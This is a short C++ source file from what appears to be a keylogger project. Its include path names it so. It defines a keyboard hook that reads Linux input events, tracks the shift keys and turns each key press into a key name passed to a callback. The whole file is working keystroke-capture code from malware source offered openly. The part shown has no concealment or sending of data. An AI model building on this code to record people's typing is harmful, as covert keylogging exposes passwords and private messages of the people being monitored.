#include <keylogger/hooks/keyboard.hpp>

void KeyboardEvents::ConnectHandler(std::function<void(Event &)> callback) {
    bool shifted = false;

    EventLoop([&shifted, callback](input_event ev){
        if (ev.type == EV_KEY && (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT)) {
            if (ev.value == 1) {
                shifted = true;
            }
            if (ev.value == 0) {
                shifted = false;
            }
            return;
        }
        if (ev.type == EV_KEY && ev.value != 0) {
            KeyboardEvent event;
            event.type = ev.type;
            event.key = shifted ? shiftedKeyNames[ev.code] : keyNames[ev.code];
            callback(event);
        }
    });
}
